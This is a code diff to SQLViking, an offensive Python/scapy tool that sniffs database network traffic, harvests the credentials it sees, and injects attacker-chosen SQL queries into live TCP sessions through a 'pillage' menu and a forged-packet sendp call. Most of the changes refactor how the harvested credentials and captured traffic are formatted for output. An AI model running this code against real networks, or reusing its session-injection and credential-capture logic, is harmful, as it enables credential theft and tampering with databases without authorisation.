@@ -1,7 +1,8 @@
 from os import walk
 from operator import itemgetter
 from scapy.all import *
-import sys, getopt, re, argparse, threading, datetime, signal
+from copy import deepcopy
+import sys, getopt, re, argparse, threading, datetime, signal, Queue
 sys.path.append("databases/")
 from constantvalues import *
 #import constantvalues
@@ -67,45 +68,29 @@ class Database():
         if user not in self.credentials:
             self.credentials[user] = [pw,salt,scheme]
 
-    #god i'm dumb. this logic should be moved out of database class; should return json formatted data. main thread can format into whatever format desired.
-    def getTraffic(self,mode):
-        if mode.upper() == 'HUMAN':
-            resp = '\n%s%s@%s:%s%s\n\n'%('-'*20,self.dbType,self.ip,self.port,'-'*20)
-            resp += 'Credentials:\n'
-            if len(self.credentials) > 0:
-                for u,p in self.credentials.iteritems():
-                    resp += '\t%s : %s\n'%(u,p)
-            else:
-                resp += 'No credentials harvested\n'
+    def getTraffic(self):
+        data = {
+            'type' : None,
+            'ip' : None,
+            'port' : None,
+            'credentials' : [],
+            'instances' : [],
+            'traffic' : []
+        }
+        traffic = {
+            'timestamp' : None,
+            'request' : None,
+            'response' : None
+        }
 
-            resp += '\nInstances:\n'
-            if len(self.instances) > 0:
-                for instanceName,instance in self.instances.iteritems():
-                    resp += '%s\n'%instanceName
-                    for tableName,table in instance.tables.iteritems():
-                        resp += '\t%s:\t%s\n'%(tableName, ', '.join(table.columns))
-            else:
-                resp += 'No instances identified\n' 
-
-            resp += '\nTraffic:\n'
-            for t in self.traffic:
-                resp += '\n--Timestamp--\n%s\n'%t.timestamp
-                resp += '--Request--\n'
-                if t.query:
-                    for q in t.query:
-                        resp += '%s\n'%q
-                else:
-                    resp += 'None\n'
-                resp += '--Response--\n'
-                if t.result:
-                    for r in t.result:
-                        resp += '%s\n'%r
-                else:
-                    resp += 'None\n'
-            resp += '\n'*100
-            return resp
-        else:
-            return 'Format not yet implemented\n\n'
+        data['type'] = self.dbType
+        data['ip'] = self.ip
+        data['port'] = self.port
+        data['credentials'] = self.credentials
+        data['instances'] = deepcopy(self.instances)
+        data['traffic'] = deepcopy(self.traffic)
+        
+        return data
 
 class Instance():
     def __init__(self,name,tables={}):
@@ -187,10 +172,10 @@ class Parse(threading.Thread):
         if self.debug == 'True':
             print(s)
 
-    def dumpResults(self,format):
-        data = ''
+    def dumpResults(self):
+        data = []
         for db in self.knownDatabases:
-            data += db.getTraffic(format)
+            data.append(db.getTraffic())
         return data
 
     def run(self):
@@ -239,7 +224,7 @@ class Parse(threading.Thread):
 
     def handle(self,pkt):
         #even with TCP filter set on scapy, will occassionally get packets
-        #with no TCP layer. throws exception and breaks thread.
+        #with no TCP layer (or maybe an empty TCP layer?). throws exception and breaks thread.
         pkts = []
         try:
             pkt[TCP]
@@ -260,7 +245,7 @@ class Parse(threading.Thread):
                     sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/DATABASELIST[c.db.dbType].encodeQuery(i[0]),iface=self.interface)
                     self.toInject.remove(i)
 
-        #check for control packets
+        #check for TCP control packets
         if pkt[TCP].flags == 17: #FIN/ACK pkt
             self.knownConns.remove(c)
             return
@@ -375,9 +360,54 @@ def writeResults(t):
     global settings
     print('[*] Enter filepath to write to:')
     path = raw_input("> ")
-    data = t.dumpResults(settings['format'])
+    data = formatData(t.dumpResults(), settings['format'])
     with open(path,'w') as f:
         f.write(data)
+    try:
+        print('[*] Data saved to: %s'%path)
+    except:
+        print('[!] Unable to save to file: %s'%path)
+        print('Error: %s'%sys.exc_info()[0])
+    time.sleep(5)
+    printMainMenu(t)
+    
+def formatData(rawData,format):
+    data = ''
+    if format.upper() == 'HUMAN':
+        for db in rawData:
+            data += '\n%s%s@%s:%s%s\n\n'%('-'*20,db['type'],db['ip'],db['port'],'-'*20)
+            data += 'Credentials:\n'
+            if len(db['credentials']) > 0:
+                for u,p in db['credentials'].iteritems():
+                    data += '\t%s : %s\n'%(u,p)
+            else:
+                data += 'No credentials harvested\n'
+
+            data += '\nInstances:\n'
+            if len(db['instances']) > 0:
+                for instanceName,instance in db['instances'].iteritems():
+                    data += '%s\n'%instanceName
+                    for tableName,table in instance.tables.iteritems():
+                        data += '\t%s:\t%s\n'%(tableName, ', '.join(table.columns))
+            else:
+                data += 'No instances identified\n' 
+
+            data += '\nTraffic:\n'
+            for t in db['traffic']:
+                data += '\n--Timestamp--\n%s\n'%t.timestamp
+                data += '--Request--\n'
+                if t.query:
+                    for q in t.query:
+                        data += '%s\n'%q
+                else:
+                    data += 'None\n'
+                data += '--Response--\n'
+                if t.result:
+                    for r in t.result:
+                        data += '%s\n'%r
+                else:
+                    data += 'None\n'
+    return data
 
 def addDb(t):
     ip = ''
@@ -406,12 +436,12 @@ def pillage():
     port = raw_input("> ")
     print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
     ans = raw_input("> ")
-    if ans == 'y' or ans == 'Y':
+    if ans.lower() == 'y':
         injectionQueue.put([query,ip,int(port)])
         print('[*] Query will run as soon as possible')
     else:
         print('[*] Cancelling...')
-    time.sleep(3)
+    time.sleep(1)
 
 def parseInput(input,t):
     if input == 'w':
@@ -448,14 +478,13 @@ def nonBlockingRawInput(t, prompt='> ', timeout=5):
     except AlarmException:
         printMainMenu(t)
     signal.signal(signal.SIGALRM,signal.SIG_IGN)
-    return ''
 
 def printMainMenu(t,wipe=True):
     if wipe:
         wipeScreen()
         y,x = os.popen('stty size', 'r').read().split()
 
-    print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
+    print('{{:^{}}}'.format(x).format('===SQLViking==='))
     print('\n[*] Current number of known DBs:\t\t%s'%t.getNumDBs())
     print('[*] Current number of known connections:\t%s'%t.getNumConns())
     print('[*] Current number of queries capured:\t\t%s'%t.getNumQueries())
